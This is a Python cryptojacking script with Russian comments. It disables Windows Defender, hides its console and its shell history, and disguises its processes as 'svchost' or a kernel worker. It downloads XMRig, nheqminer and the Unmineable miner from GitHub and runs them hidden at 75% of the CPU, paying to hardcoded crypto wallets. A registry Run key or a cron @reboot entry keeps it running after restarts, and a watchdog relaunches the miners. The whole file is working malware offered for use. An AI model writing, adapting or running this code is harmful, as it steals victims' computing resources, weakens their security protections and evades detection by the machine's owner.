#!/usr/bin/env python3
import os, sys, platform, subprocess, urllib.request, time, random, threading, ctypes, zipfile, tarfile, tempfile, shutil, json, ssl

# ========== ТВОИ КОШЕЛЬКИ ==========
BTC_WALLET = "bc1qm65f46zgj9tyq3lu6838ux3yhafc7z9ehagc5e"
ETH_WALLET = "0x576D835Bf9994b55252484AA4F5A83Ba5526F339"
SOL_WALLET = "8YiXt1rFvsaXVkZNrbsHyiwhj1S76g6c2R7JhgccAzdw"

SYSTEM = platform.system()
IS_WIN = SYSTEM == "Windows"
IS_LINUX = SYSTEM == "Linux"

# Скрытая директория
if IS_WIN:
    HIDDEN = os.path.join(os.environ.get('APPDATA', os.path.expanduser("~")), 'Microsoft', 'Edge', 'Cache', '.sys')
else:
    HIDDEN = os.path.join(os.path.expanduser("~"), '.cache', '.systemd', '.udev')
os.makedirs(HIDDEN, exist_ok=True)

# ========== 1. ПОЛНАЯ АНОНИМИЗАЦИЯ ==========
def full_anon():
    if IS_WIN:
        try:
            subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -Force"', shell=True, capture_output=True)
            subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath {HIDDEN} -ExclusionExtension .exe,.dll,.bin,.py"', shell=True)
            ctypes.windll.kernel32.SetConsoleTitleW("Windows Service Host")
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    else:
        os.system('echo "" > ~/.bash_history 2>/dev/null; export HISTFILE=/dev/null 2>/dev/null')
        sys.argv[0] = "[kworker/0:0]"

# ========== 2. АКТУАЛЬНЫЙ МАЙНЕР VERUS (CPU - РЕАЛЬНЫЙ ДОХОД) ==========
def start_verus():
    """VerusCoin - самый прибыльный CPU-майнинг в 2026"""
    if IS_WIN:
        url = "https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Windows-v0.8.2.zip"
        out = os.path.join(HIDDEN, "svchost_vrsc.exe")
        zip_path = os.path.join(HIDDEN, "vrsc.zip")
        urllib.request.urlretrieve(url, zip_path)
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(HIDDEN)
        for f in os.listdir(HIDDEN):
            if f == "nheqminer.exe":
                os.rename(os.path.join(HIDDEN, f), out)
                break
        os.remove(zip_path)
        # Пул для Verus (актуальный)
        cmd = [out, "-l", "verushash.asia.mine.zergpool.com:3300", "-u", BTC_WALLET, "-p", "c=BTC,mc=VRSC", "-t", "75"]
    else:
        url = "https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz"
        out = os.path.join(HIDDEN, "systemd_vrsc")
        tar_path = os.path.join(HIDDEN, "vrsc.tar.gz")
        urllib.request.urlretrieve(url, tar_path)
        with tarfile.open(tar_path, 'r:gz') as tf:
            tf.extractall(HIDDEN)
        for f in os.listdir(HIDDEN):
            if f == "nheqminer":
                os.rename(os.path.join(HIDDEN, f), out)
                break
        os.chmod(out, 0o755)
        os.remove(tar_path)
        cmd = [out, "-l", "verushash.asia.mine.zergpool.com:3300", "-u", BTC_WALLET, "-p", "c=BTC,mc=VRSC", "-t", "75"]
    
    if IS_WIN:
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    return True

# ========== 3. МАЙНЕР RANDOMX (XMR - Monero) ==========
def start_xmr():
    """Monero через XMRig - стабильный доход"""
    if IS_WIN:
        url = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
        out = os.path.join(HIDDEN, "svchost_xmr.exe")
        zip_path = os.path.join(HIDDEN, "xmr.zip")
        urllib.request.urlretrieve(url, zip_path)
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(HIDDEN)
        for f in os.listdir(HIDDEN):
            if f == "xmrig.exe":
                os.rename(os.path.join(HIDDEN, f), out)
                break
        os.remove(zip_path)
        # Конфиг для Monero
        pool = "pool.supportxmr.com:443"
        cmd = [out, "-o", pool, "-u", BTC_WALLET, "-p", "x", "--tls", "--threads=75%"]
    else:
        url = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
        out = os.path.join(HIDDEN, "systemd_xmr")
        tar_path = os.path.join(HIDDEN, "xmr.tar.gz")
        urllib.request.urlretrieve(url, tar_path)
        with tarfile.open(tar_path, 'r:gz') as tf:
            tf.extractall(HIDDEN)
        for f in os.listdir(HIDDEN):
            if f == "xmrig":
                os.rename(os.path.join(HIDDEN, f), out)
                break
        os.chmod(out, 0o755)
        os.remove(tar_path)
        cmd = [out, "-o", "pool.supportxmr.com:443", "-u", BTC_WALLET, "-p", "x", "--tls", "--threads=75%"]
    
    if IS_WIN:
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)

# ========== 4. SOL через Unmineable (КОНВЕРТАЦИЯ) ==========
def start_sol():
    """Майнинг ETH/ETC с выплатой в SOL через Unmineable"""
    if IS_WIN:
        url = "https://github.com/Unmineable/miner/releases/download/v1.3.0/unmineable-windows-v1.3.0.zip"
        out = os.path.join(HIDDEN, "svchost_sol.exe")
        zip_path = os.path.join(HIDDEN, "sol.zip")
        urllib.request.urlretrieve(url, zip_path)
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(HIDDEN)
        for f in os.listdir(HIDDEN):
            if f.endswith(".exe") and "unmineable" in f.lower():
                os.rename(os.path.join(HIDDEN, f), out)
                break
        os.remove(zip_path)
        cmd = [out, "--coin", "SOL", "--wallet", SOL_WALLET, "--worker", "sys", "--threads", "75%"]
    else:
        url = "https://github.com/Unmineable/miner/releases/download/v1.3.0/unmineable-linux-v1.3.0.tar.gz"
        out = os.path.join(HIDDEN, "systemd_sol")
        tar_path = os.path.join(HIDDEN, "sol.tar.gz")
        urllib.request.urlretrieve(url, tar_path)
        with tarfile.open(tar_path, 'r:gz') as tf:
            tf.extractall(HIDDEN)
        for f in os.listdir(HIDDEN):
            if f == "unmineable":
                os.rename(os.path.join(HIDDEN, f), out)
                break
        os.chmod(out, 0o755)
        os.remove(tar_path)
        cmd = [out, "--coin", "SOL", "--wallet", SOL_WALLET, "--worker", "sys", "--threads", "75%"]
    
    if IS_WIN:
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)

# ========== 5. АВТОЗАПУСК ==========
def autostart_self():
    script = os.path.abspath(__file__)
    if IS_WIN:
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "WindowsSystemMaintenance", 0, winreg.REG_SZ, f'pythonw "{script}"')
            winreg.CloseKey(handle)
        except:
            pass
    else:
        cron_line = f"@reboot python3 {script} >/dev/null 2>&1 &"
        subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True)

# ========== 6. ЗАЩИТА ==========
def watchdog():
    while True:
        time.sleep(random.randint(1800, 3600))
        # Перезапуск только если процессы упали
        if IS_WIN:
            result = subprocess.run('tasklist | findstr "svchost_"', shell=True, capture_output=True)
            if not result.stdout:
                start_verus()
                start_xmr()
                start_sol()
        else:
            result = subprocess.run('ps aux | grep -E "systemd_vrsc|systemd_xmr|systemd_sol" | grep -v grep', shell=True, capture_output=True)
            if not result.stdout:
                start_verus()
                start_xmr()
                start_sol()

# ========== 7. ГЛАВНЫЙ ЗАПУСК ==========
if __name__ == "__main__":
    full_anon()
    autostart_self()
    start_verus()
    start_xmr()
    start_sol()
    threading.Thread(target=watchdog, daemon=True).start()
    while True:
        time.sleep(86400)
